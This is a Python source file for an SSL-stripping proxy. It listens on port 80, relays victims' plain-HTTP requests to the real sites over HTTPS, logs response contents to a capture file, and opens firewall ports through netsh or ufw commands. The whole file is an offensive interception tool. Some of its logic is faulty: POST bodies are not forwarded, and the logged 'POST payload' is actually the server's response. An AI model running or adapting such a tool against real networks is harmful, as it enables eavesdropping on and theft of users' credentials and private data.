import os
import sys
import time
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
from urllib.parse import urlparse
import requests
from termcolor import colored


class SslStripper:
    def __init__(self, port=80):
        self.port = port
        self.server = HTTPServer(("", self.port), self.ForwardingHandler)

    class ForwardingHandler(SimpleHTTPRequestHandler):
        def forward_request(self, method):
            # Get host and path from headers
            host = self.headers.get("Host")

            if "localhost" in host.lower():
                raise self.BadRequestException("Invalid host")

            path = urlparse(self.path).path

            print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))

            # Forward request to specified host
            try:
                response = requests.request(method, f"https://{host}{path}")
            except requests.exceptions.RequestException as e:
                raise Exception() from e

            # Extract payload from response
            payload = response.content

            # Log payload to file
            with open("captures.log", "a") as f:
                timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
                f.write(f"[{timestamp}] http://{host}{path}: {payload}\n")  # Write capture as line

            # Print payload if POST request
            if method == "POST":
                print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))

            # Return response with payload to client
            self.send_response(response.status_code)
            self.send_header("Content-type", response.headers.get("Content-type"))
            self.end_headers()
            self.wfile.write(payload)

        class BadRequestException(Exception):  # Custom exception for bad requests
            def __init__(self, message):
                super().__init__(message)

        def handle_exceptions(self, e):
            if isinstance(e, self.BadRequestException):
                self.send_error(400, str(e))
            else:
                self.send_error(500, str(e))

        def handle_request(self, method="GET"):
            try:
                self.forward_request(method)
            except Exception as e:
                self.handle_exceptions(e)

        def do_GET(self):
            self.handle_request()

        def do_POST(self):
            self.handle_request("POST")

        def do_PUT(self):
            self.handle_request("PUT")

        def do_DELETE(self):
            self.handle_request("DELETE")

        def do_PATCH(self):
            self.handle_request("PATCH")

        def do_HEAD(self):
            self.handle_request("HEAD")

        def do_OPTIONS(self):
            self.handle_request("OPTIONS")

        def do_TRACE(self):
            self.handle_request("TRACE")

        def do_CONNECT(self):
            self.handle_request("CONNECT")

        def do_OTHER(self):
            raise self.BadRequestException("Unsupported request method")

        def log_message(self, format, *args):
            pass  # Suppress printing of log messages

    def is_port_in_use(self):
        try:
            requests.get(f"http://localhost:{self.port}", timeout=3)  # Await response for 3 seconds
            return True
        except requests.exceptions.RequestException:
            return False

    def is_port_open(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind(("", self.port))
            return True
        except OSError:
            return False
        finally:
            s.close()

    def open_port(self):
        platform_id = sys.platform  # Determine the OS

        if platform_id == "win32":  # Windows
            # Command to open a port through Windows Firewall
            cmd = f"netsh advfirewall firewall add rule name=\"Allow Port {self.port}\" dir=in action=allow protocol=TCP localport={self.port}"
            os.system(cmd)  # Execute command
        else:  # Linux
            cmd = f"sudo ufw allow {self.port}/tcp"  # Command to open a port through UFW
            os.system(cmd)  # Execute command

    def close_port(self):
        platform_id = sys.platform  # Determine the OS

        if platform_id == "win32":  # Windows
            cmd = f"netsh advfirewall firewall delete rule name=\"Allow Port {self.port}\""
            os.system(cmd)
        else:  # Linux
            cmd = f"sudo ufw deny {self.port}/tcp"  # Command to close a port through UFW
            os.system(cmd)  # Execute command

    def start(self):
        if self.is_port_in_use():
            print(colored(f"[SSL] Error: Port {self.port} is already in use. Terminate the process and retry.", "red"))
            return

        while not self.is_port_open():
            print(colored(f"[SSL] Port {self.port} is closed. Opening port and retrying..."), "light_grey")
            self.open_port()
            time.sleep(3)

        print(colored(f"[SSL] Starting webserver on port {self.port}...", "light_grey"))
        self.server.serve_forever()

    def stop(self):
        self.server.shutdown()


if __name__ == '__main__':
    ssl_stripper = SslStripper()
    ssl_stripper.start()
